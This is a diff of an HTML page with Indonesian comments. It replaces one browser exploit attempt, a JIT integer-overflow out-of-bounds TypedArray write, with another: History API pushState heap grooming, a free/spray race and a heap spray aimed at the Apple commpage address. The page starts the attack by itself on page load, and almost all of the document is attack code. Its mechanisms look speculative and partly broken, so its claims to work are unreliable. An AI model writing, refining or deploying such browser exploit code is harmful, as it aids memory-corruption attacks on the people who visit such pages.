@@ -1,29 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Integer Overflow TypedArray Index Attack</title>
+    <title>History API State Corruption Attack</title>
 </head>
 <body>
 
-    <h1>TypedArray Integer Overflow (Index Confusion)</h1>
+    <h1>History API State Corruption (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Integer Overflow Indexing...</p>
+    <p id="status">INIT: Mempersiapkan Serangan History API...</p>
     <div id="log-area"></div>
 
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
-        const TARGET_VALUE = COMM_PAGE64_BASE_ADDRESS + BigInt("0x320"); // 64-bit value
-        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); // 64-bit address
+        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
+        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
-        const LOW_WORD_VALUE = Number(TARGET_VALUE & 0xFFFFFFFFn); 
-        const HIGH_WORD_VALUE = Number(TARGET_VALUE >> 32n);
-        const LOW_WORD_ADDR = Number(TARGET_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD_ADDR = Number(TARGET_ADDRESS >> 32n);
+        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
         let startTime = performance.now();
         let payloadHolders = []; 
-        let victimTypedArray = null;
+        let historyStates = []; // Menyimpan referensi state
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -32,106 +30,84 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI HEAP SPRAY PAYLOAD (Untuk menimpa header atau data array lain) ---
+        // --- FUNGSI HEAP SPRAY PAYLOAD ---
         function sprayPayload() {
-            log("Memulai Spraying Payload (Index Confusion)...", "log-spray");
-            const SPRAY_COUNT = 3000;
+            log("Memulai Spraying Payload...", "log-spray");
+            const SPRAY_COUNT = 1500;
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                // Payload akan berisi TARGET_ADDRESS dan TARGET_VALUE
-                payloadArray[0] = HIGH_WORD_ADDR; 
-                payloadArray[1] = LOW_WORD_ADDR;
-                payloadArray[2] = HIGH_WORD_VALUE; 
-                payloadArray[3] = LOW_WORD_VALUE;
+                payloadArray[0] = HIGH_WORD; 
+                payloadArray[1] = LOW_WORD;
+                payloadArray[2] = 2031.0 + i; 
                 payloadHolders.push(payloadArray); 
             }
         }
 
-        // --- FUNGSI KRITIS: Pemicu Integer Overflow ---
-        function overflow_function(arr, initial_offset) {
-            // Mencegah JIT melihat batas akhir
-            let loop_limit = arr.length * 2; 
-
-            // Offset yang dirancang untuk menyebabkan signed/unsigned/truncation confusion
-            let offset = initial_offset; 
-
-            // Profiling loop (JIT mengoptimalkan pengecekan batas arr)
-            for (let i = 0; i < 50; i++) {
-                // Operasi yang rumit untuk membingungkan JIT
-                offset = (offset + 1) * 2; 
-                offset = offset / 2;
-                if (offset > 0x7FFFFFFF) { // Memicu Signed Overflow (simulasi)
-                    offset = 0;
-                }
-            }
-
-            // --- Titik Kerentanan ---
-            // Kita memaksa offset menjadi nilai 32-bit yang sangat besar (0xFFFFFFFF)
-            // yang di C++ diinterpretasikan secara berbeda
-            const signed_overflow_index = 0xFFFFFFFF; // -1 jika dilihat sebagai signed 32-bit
-            
-            // JIT yang optimis akan menghilangkan Bounds Check
-            // Jika Signed Overflow Index (-1) diinterpretasikan sebagai index yang valid
-            // atau nilai 0xFFFFFFFF digunakan sebagai offset yang sangat besar
-            
-            // Lakukan penulisan OOB (Type Confusion / Index Corruption)
-            // Ini akan menimpa metadata array lain atau data spray kita
-            arr[signed_overflow_index] = LOW_WORD_ADDR; // Menulis Commpage Address (Low)
-            arr[signed_overflow_index + 1] = HIGH_WORD_ADDR; // Menulis Commpage Address (High)
-            
-            // Lakukan pembacaan OOB (Trigger Arbitrary Read)
-            const OOB_READ_INDEX = signed_overflow_index + 2; 
-            return arr[OOB_READ_INDEX];
-        }
-
         // --- FUNGSI UTAMA ATTACK ---
-        function runOverflowAttack() {
+        function runHistoryAttack() {
             startTime = performance.now();
-            log("Phase 1: Grooming dan Profiling JIT Function.", "log-init");
+            log("Phase 1: Melakukan Heap Grooming dengan History State.", "log-init");
 
-            // 1. Array Korban
-            victimTypedArray = new Uint32Array(100); 
-
-            // 2. Profiling (Memaksa kompilasi overflow_function)
-            for (let i = 0; i < 10000; i++) {
-                try {
-                   overflow_function(victimTypedArray, 10);
-                } catch(e) {}
-            }
-            log("Phase 2: overflow_function dikompilasi JIT.", "log-info");
+            const HISTORY_COUNT = 100;
+            const STATE_ARRAY_SIZE = 1024 * 1024; // State 4MB (cukup besar untuk fragmentasi heap)
             
-            // 3. JIT Spray Agresif (Untuk menimpa lokasi yang dituju oleh OOB Write)
-            sprayPayload(); 
-
-            // 4. Trigger Final
-            log("Phase 3: Memicu Integer Overflow dan Arbitrary Read...", "log-critical");
-            
-            try {
-                // Panggil fungsi yang sudah dioptimalkan JIT
-                const result = overflow_function(victimTypedArray, 10);
+            // 1. Fragmentasi Heap dengan History State
+            for (let i = 0; i < HISTORY_COUNT; i++) {
+                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
+                // Isi array dengan nilai yang unik
+                stateArray.fill(0xFEEDFACE + i);
                 
-                // Jika berhasil, result adalah nilai 32-bit dari lokasi memori yang korup
-                log(`Nilai OOB dibaca (32-bit): 0x${result.toString(16)}`, "log-critical");
+                // Gunakan pushState untuk menyimpan objek yang besar dan kompleks
+                // Ini memaksa serialization dan alokasi memori C++ di History Cache
+                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
+                historyStates.push(stateArray);
+            }
+            log(`Phase 2: ${HISTORY_COUNT} History State Besar diserialisasi.`, "log-info");
 
-                if (result === LOW_WORD_ADDR) {
-                    log("SUCCESS: Arbitrary Read primitif (Low Word Commpage Address)!", "log-success");
+            // 2. Memicu Corrupt State
+            // Kita coba kembali ke state yang sangat tua, berharap memuat ulang objek yang sudah fragmentasi
+            window.history.go(-HISTORY_COUNT + 1);
+            log("Phase 3: Navigasi cepat ke History State awal.", "log-critical");
+
+            // 3. FREE/SPRAY Race
+            // Kita segera membersihkan referensi JavaScript dan melakukan spray
+            // Ini menciptakan UAF di History Cache C++
+            setTimeout(() => {
+                log("Phase 4: Memicu FREE/SPRAY...", "log-critical");
+                
+                // Hapus semua referensi JS (memaksa GC)
+                historyStates = null;
+                
+                // Lakukan Spray Payload
+                sprayPayload(); 
+                
+                // 4. Trigger Eksploitasi: Memicu Pemanggilan State Corrupt
+                // Coba navigasi cepat lagi. WebKit harus membaca objek state yang sudah ditimpa
+                
+                // Menggunakan pushState lagi setelah spray akan mencoba menulis ke lokasi yang sama.
+                let attackerState = new Float64Array(1024); // Array kecil untuk pemicu
+                attackerState.fill(HIGH_WORD);
+                window.history.pushState({ trigger: attackerState }, 'Attack', '#attack');
+
+                log("Phase 5: Navigasi/pushState Attacker. Menunggu Crash Implisit.", "log-critical");
+            }, 100); 
+            
+            // Trigger alternatif: Memicu GC agresif untuk membersihkan History Cache
+            setTimeout(() => {
+                // Tidak ada cara langsung, jadi kita alokasikan banyak memori lagi
+                for(let i = 0; i < 50; i++) {
+                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF); // 5MB x 50 = 250MB filler
                 }
-                
-                // Trigger Arbitrary Read pada Commpage Address (untuk mendapatkan log)
-                let crashFunction = new Function('a', `return a[${result}]`);
-                crashFunction(new Array(10)); // Akan crash jika result adalah alamat Commpage
-
-            } catch(e) {
-                 log(`JS Exception: ${e.message} - Menunggu Crash OS (Arbitrary Read)...`, "log-critical");
-            }
+                log("Trigger GC Implisit selesai.", "log-info");
+            }, 200);
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian Integer Overflow Attack...';
-            setTimeout(runOverflowAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Signed/Unsigned Index Confusion.';
+            document.getElementById('status').textContent = 'Memulai rangkaian History API Attack...';
+            setTimeout(runHistoryAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah State Corruption.';
         });
     </script>
     <style>
